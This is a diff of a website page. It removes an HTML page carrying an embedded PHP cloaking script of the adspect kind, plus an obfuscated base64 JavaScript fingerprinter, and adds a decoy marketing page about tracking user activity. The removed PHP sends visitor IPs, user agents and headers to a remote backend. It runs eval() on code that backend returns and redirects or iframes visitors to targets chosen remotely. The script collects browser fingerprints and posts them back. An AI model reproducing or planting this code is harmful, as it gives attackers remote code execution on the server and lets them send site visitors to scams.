+            </div>
         </div>
-  </body>
-</html>
-<?php
- ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url = '') { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; if ($url !== '') { $url = parse_url($url); if (isset($url['path'])) { if (substr($url['path'], 0, 1) === '/') { $_SERVER['REQUEST_URI'] = $url['path']; } else { $_SERVER['REQUEST_URI'] = dirname($_SERVER['REQUEST_URI']) . '/' . $url['path']; } } if (isset($url['query'])) { parse_str($url['query'], $_GET); $_SERVER['QUERY_STRING'] = $url['query']; } else { $_GET = []; $_SERVER['QUERY_STRING'] = ''; } } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_REAL_IP']]; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_ENCODING, ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); adspect_spoof_request(); return null; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('b1c81754-7b92-4ab2-9e69-f9f93dbb8aa1', 'redirect', '_', base64_decode('+dTeQuBz5OR+lrPwig9tNEgeN+MUzt3i+K7/hy2kQ2o=')); if (!isset($target)) { return; } ?>
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-  </head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="root">
-          <script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4YzE5NyhfMHgzMThjYmIsXzB4MjM3ZGUzKXt2YXIgXzB4M2U1YTUzPV8weDNlNWEoKTtyZXR1cm4gXzB4YzE5Nz1mdW5jdGlvbihfMHhjMTk3NjgsXzB4NGViOWM3KXtfMHhjMTk3Njg9XzB4YzE5NzY4LTB4NzQ7dmFyIF8weDEzMjc0Mz1fMHgzZTVhNTNbXzB4YzE5NzY4XTtyZXR1cm4gXzB4MTMyNzQzO30sXzB4YzE5NyhfMHgzMThjYmIsXzB4MjM3ZGUzKTt9KGZ1bmN0aW9uKF8weDQ3OTYxZixfMHgzNjk0ZDQpe3ZhciBfMHgzYTA3MjQ9XzB4YzE5NyxfMHg0Yjg2MDc9XzB4NDc5NjFmKCk7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHgzNTJmZWE9LXBhcnNlSW50KF8weDNhMDcyNCgweDk3KSkvMHgxK3BhcnNlSW50KF8weDNhMDcyNCgweDhjKSkvMHgyKigtcGFyc2VJbnQoXzB4M2EwNzI0KDB4OGYpKS8weDMpKy1wYXJzZUludChfMHgzYTA3MjQoMHg5NCkpLzB4NCoocGFyc2VJbnQoXzB4M2EwNzI0KDB4N2MpKS8weDUpKy1wYXJzZUludChfMHgzYTA3MjQoMHg5MCkpLzB4NistcGFyc2VJbnQoXzB4M2EwNzI0KDB4ODYpKS8weDcrcGFyc2VJbnQoXzB4M2EwNzI0KDB4OTkpKS8weDgrLXBhcnNlSW50KF8weDNhMDcyNCgweGE0KSkvMHg5KigtcGFyc2VJbnQoXzB4M2EwNzI0KDB4ODEpKS8weGEpO2lmKF8weDM1MmZlYT09PV8weDM2OTRkNClicmVhaztlbHNlIF8weDRiODYwN1sncHVzaCddKF8weDRiODYwN1snc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MTc3NDg3KXtfMHg0Yjg2MDdbJ3B1c2gnXShfMHg0Yjg2MDdbJ3NoaWZ0J10oKSk7fX19KF8weDNlNWEsMHg0Mjg1NSksKGZ1bmN0aW9uKCl7dmFyIF8weDEyMGFkZD1fMHhjMTk3LF8weDQzZWRiMT1bXSxfMHgzMjE2Y2E9e307dHJ5e2Z1bmN0aW9uIF8weDE0YmQ5NShfMHgxZWVmYmQpe3ZhciBfMHg0ZDA3MDc9XzB4YzE5NztpZihfMHg0ZDA3MDcoMHg3ZCk9PT10eXBlb2YgXzB4MWVlZmJkJiZudWxsIT09XzB4MWVlZmJkKXt2YXIgXzB4M2Y0ZjhhPXt9O2Z1bmN0aW9uIF8weDU5NGEzYyhfMHgyNzM4NGQpe3ZhciBfMHg0YThhNDk9XzB4NGQwNzA3O3RyeXt2YXIgXzB4MjZiYjBlPV8weDFlZWZiZFtfMHgyNzM4NGRdO3N3aXRjaCh0eXBlb2YgXzB4MjZiYjBlKXtjYXNlIF8weDRhOGE0OSgweDdkKTppZihudWxsPT09XzB4MjZiYjBlKWJyZWFrO2Nhc2UgXzB4NGE4YTQ5KDB4NzcpOl8weDI2YmIwZT1fMHgyNmJiMGVbJ3RvU3RyaW5nJ10oKTt9XzB4M2Y0ZjhhW18weDI3Mzg0ZF09XzB4MjZiYjBlO31jYXRjaChfMHg0ZWRhNGEpe18weDQzZWRiMVtfMHg0YThhNDkoMHg4ZSldKF8weDRlZGE0YVsnbWVzc2FnZSddKTt9fWZvcih2YXIgXzB4NDU4OWY5IGluIF8weDFlZWZiZClfMHg1OTRhM2MoXzB4NDU4OWY5KTt0cnl7dmFyIF8weDVlM2Q5Yj1PYmplY3RbXzB4NGQwNzA3KDB4YTMpXShfMHgxZWVmYmQpO2ZvcihfMHg0NTg5Zjk9MHgwO18weDQ1ODlmOTxfMHg1ZTNkOWJbXzB4NGQwNzA3KDB4ODIpXTsrK18weDQ1ODlmOSlfMHg1OTRhM2MoXzB4NWUzZDliW18weDQ1ODlmOV0pO18weDNmNGY4YVsnISEnXT1fMHg1ZTNkOWI7fWNhdGNoKF8weGFhNjY4NSl7XzB4NDNlZGIxW18weDRkMDcwNygweDhlKV0oXzB4YWE2Njg1W18weDRkMDcwNygweDdiKV0pO31yZXR1cm4gXzB4M2Y0ZjhhO319XzB4MzIxNmNhW18weDEyMGFkZCgweDkzKV09XzB4MTRiZDk1KHdpbmRvd1tfMHgxMjBhZGQoMHg5MyldKSxfMHgzMjE2Y2FbJ3dpbmRvdyddPV8weDE0YmQ5NSh3aW5kb3cpLF8weDMyMTZjYVtfMHgxMjBhZGQoMHhhOCldPV8weDE0YmQ5NSh3aW5kb3dbXzB4MTIwYWRkKDB4YTgpXSksXzB4MzIxNmNhW18weDEyMGFkZCgweDhiKV09XzB4MTRiZDk1KHdpbmRvd1tfMHgxMjBhZGQoMHg4YildKSxfMHgzMjE2Y2FbJ2NvbnNvbGUnXT1fMHgxNGJkOTUod2luZG93W18weDEyMGFkZCgweDlhKV0pLF8weDMyMTZjYVtfMHgxMjBhZGQoMHg3NCldPWZ1bmN0aW9uKF8weGU4YjNjMSl7dmFyIF8weDc3MDUzZD1fMHgxMjBhZGQ7dHJ5e3ZhciBfMHgzNWYzZTc9e307XzB4ZThiM2MxPV8weGU4YjNjMVtfMHg3NzA1M2QoMHg3ZildO2Zvcih2YXIgXzB4NTA3ZGFhIGluIF8weGU4YjNjMSlfMHg1MDdkYWE9XzB4ZThiM2MxW18weDUwN2RhYV0sXzB4MzVmM2U3W18weDUwN2RhYVtfMHg3NzA1M2QoMHg3YSldXT1fMHg1MDdkYWFbXzB4NzcwNTNkKDB4YTApXTtyZXR1cm4gXzB4MzVmM2U3O31jYXRjaChfMHgyZjAwYWMpe18weDQzZWRiMVtfMHg3NzA1M2QoMHg4ZSldKF8weDJmMDBhY1tfMHg3NzA1M2QoMHg3YildKTt9fShkb2N1bWVudFtfMHgxMjBhZGQoMHg3NCldKSxfMHgzMjE2Y2FbXzB4MTIwYWRkKDB4OGQpXT1fMHgxNGJkOTUoZG9jdW1lbnQpO3RyeXtfMHgzMjE2Y2FbXzB4MTIwYWRkKDB4YTEpXT1uZXcgRGF0ZSgpW18weDEyMGFkZCgweDg5KV0oKTt9Y2F0Y2goXzB4MmI1NDU3KXtfMHg0M2VkYjFbXzB4MTIwYWRkKDB4OGUpXShfMHgyYjU0NTdbJ21lc3NhZ2UnXSk7fXRyeXtfMHgzMjE2Y2FbXzB4MTIwYWRkKDB4N2UpXT1mdW5jdGlvbigpe31bXzB4MTIwYWRkKDB4OWIpXSgpO31jYXRjaChfMHgyMDI5NDApe18weDQzZWRiMVtfMHgxMjBhZGQoMHg4ZSldKF8weDIwMjk0MFtfMHgxMjBhZGQoMHg3YildKTt9dHJ5e18weDMyMTZjYVsndG91Y2hFdmVudCddPWRvY3VtZW50W18weDEyMGFkZCgweDk1KV0oJ1RvdWNoRXZlbnQnKVsndG9TdHJpbmcnXSgpO31jYXRjaChfMHgzNDlmNGMpe18weDQzZWRiMVtfMHgxMjBhZGQoMHg4ZSldKF8weDM0OWY0Y1tfMHgxMjBhZGQoMHg3YildKTt9dHJ5e3ZhciBfMHgzMWViZDI9ZnVuY3Rpb24oKXt9LF8weDMyNTZjOT0weDA7XzB4MzFlYmQyWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHgzMjU2YzksJyc7fSxjb25zb2xlWydsb2cnXShfMHgzMWViZDIpLF8weDMyMTZjYVsndG9zdHJpbmcnXT1fMHgzMjU2Yzk7fWNhdGNoKF8weDQxZjkzZil7XzB4NDNlZGIxWydwdXNoJ10oXzB4NDFmOTNmW18weDEyMGFkZCgweDdiKV0pO310cnl7dmFyIF8weDE4OWY2Mz1kb2N1bWVudFtfMHgxMjBhZGQoMHg4YSldKF8weDEyMGFkZCgweDk2KSlbJ2dldENvbnRleHQnXShfMHgxMjBhZGQoMHg5OCkpLF8weGMyZjQyMD1fMHgxODlmNjNbXzB4MTIwYWRkKDB4ODQpXShfMHgxMjBhZGQoMHg3OSkpO18weDMyMTZjYVsnd2ViZ2wnXT17J3ZlbmRvcic6XzB4MTg5ZjYzWydnZXRQYXJhbWV0ZXInXShfMHhjMmY0MjBbXzB4MTIwYWRkKDB4NzUpXSksJ3JlbmRlcmVyJzpfMHgxODlmNjNbXzB4MTIwYWRkKDB4OWMpXShfMHhjMmY0MjBbXzB4MTIwYWRkKDB4OWUpXSl9O31jYXRjaChfMHg0YzYwOGMpe18weDQzZWRiMVsncHVzaCddKF8weDRjNjA4Y1tfMHgxMjBhZGQoMHg3YildKTt9ZnVuY3Rpb24gXzB4MTI4ZGJjKF8weDQ4YWU0YyxfMHgxMjBjMmUsXzB4NWFhMjNmKXt2YXIgXzB4MzUxMzk1PV8weDEyMGFkZCxfMHg0ZWQyYjI9XzB4NDhhZTRjW18weDM1MTM5NSgweDkxKV1bXzB4MTIwYzJlXTtfMHg0OGFlNGNbXzB4MzUxMzk1KDB4OTEpXVtfMHgxMjBjMmVdPWZ1bmN0aW9uKCl7dmFyIF8weDU3MWFhMj1fMHgzNTEzOTU7XzB4MzIxNmNhW18weDU3MWFhMigweDg1KV09ITB4MDt9LF8weDVhYTIzZigpLF8weDQ4YWU0Y1sncHJvdG90eXBlJ11bXzB4MTIwYzJlXT1fMHg0ZWQyYjI7fXRyeXtfMHgxMjhkYmMoQXJyYXksJ2luY2x1ZGVzJyxmdW5jdGlvbigpe3ZhciBfMHg4OGRhZTY9XzB4MTIwYWRkO3JldHVybiBkb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKF8weDg4ZGFlNigweDg3KSlbJ2NhblBsYXlUeXBlJ10oXzB4ODhkYWU2KDB4OTIpKTt9KTt9Y2F0Y2goXzB4NTliMmFhKXt9fWNhdGNoKF8weDNkOTQ4Mil7XzB4NDNlZGIxW18weDEyMGFkZCgweDhlKV0oXzB4M2Q5NDgyW18weDEyMGFkZCgweDdiKV0pO30oZnVuY3Rpb24oKXt2YXIgXzB4MjkwMTAxPV8weDEyMGFkZDtfMHgzMjE2Y2FbXzB4MjkwMTAxKDB4YTYpXT1fMHg0M2VkYjE7dmFyIF8weDNlYjhiNj1kb2N1bWVudFtfMHgyOTAxMDEoMHg4YSldKF8weDI5MDEwMSgweDc2KSksXzB4M2Y3MThjPWRvY3VtZW50W18weDI5MDEwMSgweDhhKV0oJ2lucHV0Jyk7XzB4M2ViOGI2WydtZXRob2QnXT1fMHgyOTAxMDEoMHg5ZiksXzB4M2ViOGI2W18weDI5MDEwMSgweGEyKV09d2luZG93W18weDI5MDEwMSgweDhiKV1bXzB4MjkwMTAxKDB4ODApXSxfMHgzZjcxOGNbXzB4MjkwMTAxKDB4NzgpXT1fMHgyOTAxMDEoMHhhNyksXzB4M2Y3MThjW18weDI5MDEwMSgweDlkKV09J2RhdGEnLF8weDNmNzE4Y1sndmFsdWUnXT1KU09OWydzdHJpbmdpZnknXShfMHgzMjE2Y2EpLF8weDNlYjhiNltfMHgyOTAxMDEoMHg4MyldKF8weDNmNzE4YyksZG9jdW1lbnRbXzB4MjkwMTAxKDB4YTUpXVsnYXBwZW5kQ2hpbGQnXShfMHgzZWI4YjYpLF8weDNlYjhiNltfMHgyOTAxMDEoMHg4OCldKCk7fSgpKTt9KCkpKTtmdW5jdGlvbiBfMHgzZTVhKCl7dmFyIF8weDEwNjk4YT1bJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nLCdub2RlTmFtZScsJ21lc3NhZ2UnLCc3MDU1NXNieklOaycsJ29iamVjdCcsJ2Nsb3N1cmUnLCdhdHRyaWJ1dGVzJywnaHJlZicsJzQ3NzBCQ1VuQU4nLCdsZW5ndGgnLCdhcHBlbmRDaGlsZCcsJ2dldEV4dGVuc2lvbicsJ3Byb3RvJywnMTU3NDk2NU52YWFEYycsJ3ZpZGVvJywnc3VibWl0JywnZ2V0VGltZXpvbmVPZmZzZXQnLCdjcmVhdGVFbGVtZW50JywnbG9jYXRpb24nLCcxODBXZktDUkwnLCdkb2N1bWVudCcsJ3B1c2gnLCcxODAyMVVJdWRuUicsJzkyMzg5MnVHc1BTQicsJ3Byb3RvdHlwZScsJ3ZpZGVvL21wNCcsJ3NjcmVlbicsJzI0Ym5qZWp6JywnY3JlYXRlRXZlbnQnLCdjYW52YXMnLCcxMzEzMzF2Z0t3VEgnLCd3ZWJnbCcsJzk2NTIwMFFKWkROdScsJ2NvbnNvbGUnLCd0b1N0cmluZycsJ2dldFBhcmFtZXRlcicsJ25hbWUnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJ1BPU1QnLCdub2RlVmFsdWUnLCd0aW1lem9uZU9mZnNldCcsJ2FjdGlvbicsJ2dldE93blByb3BlcnR5TmFtZXMnLCcyNDI5MXJzYkRLWCcsJ2JvZHknLCdlcnJvcnMnLCdoaWRkZW4nLCduYXZpZ2F0b3InLCdkb2N1bWVudEVsZW1lbnQnLCdVTk1BU0tFRF9WRU5ET1JfV0VCR0wnLCdmb3JtJywnZnVuY3Rpb24nLCd0eXBlJ107XzB4M2U1YT1mdW5jdGlvbigpe3JldHVybiBfMHgxMDY5OGE7fTtyZXR1cm4gXzB4M2U1YSgpO30="></script>
+    </nav>
+    <!-- Banner -->
+    <section id="banner" class="banner">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 mx-auto">
+                    <h1>Track user activity on your website</h1>
+                    <p>User activity tracking is the process of monitoring, collecting, and analyzing visitor browsing
+                        behavior on a website or app.
+
+                        The easiest and most popular way to start tracking website users is to set up Google Analytics
+                        (we'll show you how below). But Google Analytics (GA) can be equal parts overwhelming and
+                        limited: it’s packed with options but will only show you what happens on your site, not why.</p>
+
+                    <a href="#contact" class="btn">Get a free quote</a>
+                </div>
+            </div>
         </div>
-  </body>
+    </section>
+    <!-- Services -->
+    <section id="services" class="services">
+        <div class="container">
+            <h2>Our Services</h2>
+            <div class="row">
+                <div class="col-lg-4 col-md-6 mb-4">
+                    <div class="card">
+                        <img src="https://source.unsplash.com/500x300/?seo" alt="SEO" class="card-img-top">
+                        <div class="card-body">
+                            <h3 class="card-title">Way to track scroll depth</h3>
+                            Tracking scroll depth gives you this power, providing actionable insights to improve the
+                            user experience (UX) by revealing your site visitors’ scrolling behavior.
+                            <p></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+</body>
+
 </html>
